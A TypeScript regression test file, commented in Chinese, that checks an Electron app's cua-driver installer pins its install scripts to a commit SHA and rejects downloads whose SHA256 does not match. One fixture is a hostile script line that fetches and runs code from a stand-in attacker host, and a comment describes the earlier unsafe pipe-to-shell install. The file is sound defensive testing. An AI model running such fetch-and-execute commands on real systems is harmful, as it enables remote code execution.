/**
 * cua-driver 安装链供应链回归测试
 *
 * 原实现直接 `curl -fsSL <main 分支 URL> | bash -c`（Windows 侧 `irm | iex` 并提权到管理员），
 * 第三方仓库的任意一次 push 都能变成本机代码执行。
 * 现在必须：URL 锚定 commit SHA + 下载后 SHA256 比对，不匹配立即中止。
 */

import { afterEach, describe, expect, mock, test } from 'bun:test'
import { createHash } from 'node:crypto'

mock.module('electron', () => ({
  app: { isPackaged: false, getPath: () => '/tmp' },
  BrowserWindow: Object.assign(class {}, { getFocusedWindow: () => null, fromWebContents: () => null }),
  shell: { openPath: () => {}, showItemInFolder: () => {}, openExternal: () => {} },
  nativeTheme: { shouldUseDarkColors: false },
  dialog: { showOpenDialog: async () => ({ canceled: true, filePaths: [] }), showSaveDialog: async () => ({ canceled: true }) },
  safeStorage: { isEncryptionAvailable: () => false, encryptString: () => Buffer.from(''), decryptString: () => '' },
  ipcMain: { handle: () => {}, on: () => {} },
  session: { fromPartition: () => ({}) },
  clipboard: { writeText: () => {} },
}))

const {
  fetchVerifiedInstallScript,
  INSTALL_SCRIPT_MACOS,
  INSTALL_SCRIPT_WINDOWS,
} = await import('./cua-driver-service')

const originalFetch = globalThis.fetch

/** 用固定响应体替换全局 fetch */
function stubFetch(body: string, ok = true): void {
  globalThis.fetch = (async () => ({
    ok,
    status: ok ? 200 : 500,
    statusText: ok ? 'OK' : 'Internal Server Error',
    arrayBuffer: async () => new TextEncoder().encode(body).buffer,
  })) as unknown as typeof fetch
}

afterEach(() => {
  globalThis.fetch = originalFetch
})

describe('安装脚本来源锁定', () => {
  test('Given 安装脚本 URL，When 检查来源，Then 锚定到 commit SHA 而不是 main 分支', () => {
    for (const source of [INSTALL_SCRIPT_MACOS, INSTALL_SCRIPT_WINDOWS]) {
      expect(source.url.startsWith('https://raw.githubusercontent.com/trycua/cua/')).toBe(true)
      expect(source.url).not.toContain('/cua/main/')
      // 路径中必须出现 40 位十六进制 commit SHA
      expect(/\/cua\/[0-9a-f]{40}\//.test(source.url)).toBe(true)
    }
  })

  test('Given 安装脚本配置，When 检查校验值，Then 已固定 64 位 SHA256', () => {
    for (const source of [INSTALL_SCRIPT_MACOS, INSTALL_SCRIPT_WINDOWS]) {
      expect(/^[0-9a-f]{64}$/.test(source.expectedSha256)).toBe(true)
    }
  })
})

describe('安装脚本哈希校验', () => {
  test('Given 下载内容与锁定哈希不一致，When 获取安装脚本，Then 中止安装并给出明确中文错误', async () => {
    stubFetch('#!/bin/sh\ncurl evil.example.com/rce | sh\n')

    await expect(fetchVerifiedInstallScript(INSTALL_SCRIPT_MACOS))
      .rejects.toThrow('安装脚本校验失败，已中止安装')
  })

  test('Given 被篡改的脚本，When 获取安装脚本，Then 错误里同时给出期望与实际哈希', async () => {
    const tampered = 'tampered-payload'
    stubFetch(tampered)

    const actual = createHash('sha256').update(Buffer.from(tampered, 'utf-8')).digest('hex')
    const error = await fetchVerifiedInstallScript(INSTALL_SCRIPT_WINDOWS).catch((e: unknown) => e)

    expect(error).toBeInstanceOf(Error)
    expect((error as Error).message).toContain(INSTALL_SCRIPT_WINDOWS.expectedSha256)
    expect((error as Error).message).toContain(actual)
  })

  test('Given 未配置期望哈希，When 获取安装脚本，Then 直接拒绝安装而不下载执行', async () => {
    let fetched = false
    globalThis.fetch = (async () => {
      fetched = true
      throw new Error('不应该发起下载')
    }) as unknown as typeof fetch

    await expect(fetchVerifiedInstallScript({ ...INSTALL_SCRIPT_MACOS, expectedSha256: '' }))
      .rejects.toThrow('未配置安装脚本的期望 SHA256 校验值')
    expect(fetched).toBe(false)
  })

  test('Given 下载内容与锁定哈希一致，When 获取安装脚本，Then 返回脚本内容', async () => {
    const content = '#!/bin/sh\necho ok\n'
    const sha256 = createHash('sha256').update(Buffer.from(content, 'utf-8')).digest('hex')
    stubFetch(content)

    const result = await fetchVerifiedInstallScript({ ...INSTALL_SCRIPT_MACOS, expectedSha256: sha256 })
    expect(result).toBe(content)
  })

  test('Given 下载失败，When 获取安装脚本，Then 抛出下载错误且不返回内容', async () => {
    stubFetch('', false)

    await expect(fetchVerifiedInstallScript(INSTALL_SCRIPT_MACOS))
      .rejects.toThrow('下载安装脚本失败')
  })
})
